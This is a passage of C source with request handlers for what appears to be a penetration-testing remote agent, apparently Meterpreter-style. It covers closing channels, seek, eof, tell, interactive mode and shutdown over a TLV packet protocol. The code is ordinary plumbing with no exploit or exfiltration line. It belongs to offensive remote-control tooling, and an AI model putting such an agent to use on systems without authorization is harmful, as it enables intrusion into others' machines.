	// Transmit the acknowledgement
	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_LENGTH, bytesRead);
		packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);

		res = packet_transmit_response(res, remote, response);
	}

	return res;
}

/*
 * core_channel_close
 * ------------------
 *
 * Closes a previously opened channel.
 *
 * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to close
 */
DWORD remote_request_core_channel_close(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS, channelId;
	Channel *channel = NULL;

	dprintf("[CHANNEL] remote_request_core_channel_close.");

	do
	{
		// Get the channel identifier
		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);

		// Try to locate the specified channel
		if (!(channel = channel_find_by_id(channelId)))
		{
			res = ERROR_NOT_FOUND;
			dprintf("[CHANNEL] unable to find channel of id %d", channelId);
			break;
		}

		// Destroy the channel
		dprintf("[CHANNEL] closing channel of id %d", channelId);
		channel_destroy(channel, packet);

		if (response)
		{
			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);
		}

	} while (0);

	// Transmit the acknowledgement
	if (response)
	{
		res = packet_transmit_response(res, remote, response);
	}

	return res;
}

/*
 * core_channel_close (response)
 * ------------------
 *
 * Removes the local instance of the channel
 *
 * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to close
 */
DWORD remote_response_core_channel_close(Remote *remote, Packet *packet)
{
	DWORD res = ERROR_SUCCESS, channelId;
	Channel *channel = NULL;

	do
	{
		// Get the channel identifier
		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);

		// Try to locate the specified channel
		if (!(channel = channel_find_by_id(channelId)))
		{
			res = ERROR_NOT_FOUND;
			break;
		}

		// Destroy the channel
		channel_destroy(channel, packet);

	} while (0);

	return res;
}


/*
 * core_channel_seek
 * -----------------
 *
 * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to seek on
 * req: TLV_TYPE_SEEK_OFFSET -- The offset to seek to
 * req: TLV_TYPE_SEEK_WHENCE -- The relativity to which the offset refers
 */
DWORD remote_request_core_channel_seek(Remote *remote, Packet *packet)
{
	Channel *channel = NULL;
	Packet *response = packet_create_response(packet);
	DWORD result = ERROR_SUCCESS;

	do
	{
		// Lookup the channel by its identifier
		if (!(channel = channel_find_by_id(
				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
		{
			result = ERROR_NOT_FOUND;
			break;
		}

		lock_acquire( channel->lock );

		// Make sure this class is compatible
		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
		{
			result = ERROR_NOT_SUPPORTED;
			break;
		}

		// Call the function if it's set
		if (channel->ops.pool.seek)
			result = channel->ops.pool.seek(channel, packet, 
					channel->ops.pool.native.context, 
					(LONG)packet_get_tlv_value_uint(packet, TLV_TYPE_SEEK_OFFSET),
					packet_get_tlv_value_uint(packet, TLV_TYPE_SEEK_WHENCE));
		else
			result = ERROR_NOT_SUPPORTED;

	} while (0);
	
	if( channel )
		lock_release( channel->lock );

	// Transmit the result
	packet_transmit_response(result, remote, response);

	return result;
}

/*
 * core_channel_eof
 * -----------------
 *
 * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to check eof on
 */
DWORD remote_request_core_channel_eof(Remote *remote, Packet *packet)
{
	Channel *channel = NULL;
	Packet *response = packet_create_response(packet);
	DWORD result = ERROR_SUCCESS;
	BOOL isEof = FALSE;

	do
	{
		// Lookup the channel by its identifier
		if (!(channel = channel_find_by_id(
				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
		{
			result = ERROR_NOT_FOUND;
			break;
		}

		lock_acquire( channel->lock );

		// Make sure this class is compatible
		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
		{
			result = ERROR_NOT_SUPPORTED;
			break;
		}

		// Call the function if it's set
		if (channel->ops.pool.eof)
			result = channel->ops.pool.eof(channel, packet, 
					channel->ops.pool.native.context, 
					&isEof);
		else
			result = ERROR_NOT_SUPPORTED;

	} while (0);
	
	if( channel )
		lock_release( channel->lock );

	// Add the EOF flag
	packet_add_tlv_bool(response, TLV_TYPE_BOOL, isEof);

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return result;
}

/*
 * core_channel_tell
 * -----------------
 *
 * req: TLV_TYPE_CHANNEL_ID  -- The channel identifier to check tell on
 */
DWORD remote_request_core_channel_tell(Remote *remote, Packet *packet)
{
	Channel *channel = NULL;
	Packet *response = packet_create_response(packet);
	DWORD result = ERROR_SUCCESS;
	LONG offset = 0;

	do
	{
		// Lookup the channel by its identifier
		if (!(channel = channel_find_by_id(
				packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID))))
		{
			result = ERROR_NOT_FOUND;
			break;
		}

		lock_acquire( channel->lock );

		// Make sure this class is compatible
		if (channel_get_class(channel) != CHANNEL_CLASS_POOL)
		{
			result = ERROR_NOT_SUPPORTED;
			break;
		}

		// Call the function if it's set
		if (channel->ops.pool.tell)
			result = channel->ops.pool.tell(channel, packet, 
					channel->ops.pool.native.context, 
					&offset);
		else
			result = ERROR_NOT_SUPPORTED;

	} while (0);

	if( channel )
		lock_release( channel->lock );

	// Add the offset
	packet_add_tlv_uint(response, TLV_TYPE_SEEK_POS, offset);

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return result;
}


/*
 * core_channel_interact
 * ---------------------
 *
 * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to interact with
 * req: TLV_TYPE_BOOL       -- True if interactive, false if not.
 */
DWORD remote_request_core_channel_interact(Remote* remote, Packet* packet)
{
	Packet* response = packet_create_response(packet);
	Channel* channel = NULL;
	DWORD channelId;
	DWORD result = ERROR_SUCCESS;
	BOOLEAN interact;

	// Get the channel identifier
	channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
	interact = packet_get_tlv_value_bool(packet, TLV_TYPE_BOOL);

	// If the channel is found, set the interactive flag accordingly
	if ((channel = channel_find_by_id(channelId)))
	{
		lock_acquire(channel->lock);

		// If the response packet is valid
		if ((response) && (channel_get_class(channel) != CHANNEL_CLASS_BUFFERED))
		{
			NativeChannelOps* native = (NativeChannelOps*)&channel->ops;

			// Check to see if this channel has a registered interact handler
			dprintf("[DISPATCH] attempting to set interactive: %d context 0x%p", interact, native->context);
			if (native->interact)
			{
				result = native->interact(channel, packet, native->context, interact);
			}
		}

		// Set the channel's interactive state
		channel_set_interactive(channel, interact);

		lock_release(channel->lock);
	}

	// Send the response to the requestor so that the interaction can be 
	// complete
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * core_shutdown
 * -----------------
 */
DWORD remote_request_core_shutdown( Remote *remote, Packet *packet, DWORD* pResult )
{
	Channel *channel = NULL;
	Packet *response = packet_create_response( packet );
	DWORD result = ERROR_SUCCESS;

	// Acknowledge the shutdown request
	packet_add_tlv_bool( response, TLV_TYPE_BOOL, TRUE );

	// Transmit the response
	dprintf("[DISPATCH] Ack shutdown request");
	packet_transmit_response( result, remote, response );

	*pResult = result;

	dprintf("[DISPATCH] Telling dispatch loop to finish");
	// We always return FALSE here to tell the server to terminate.
	return FALSE;
}
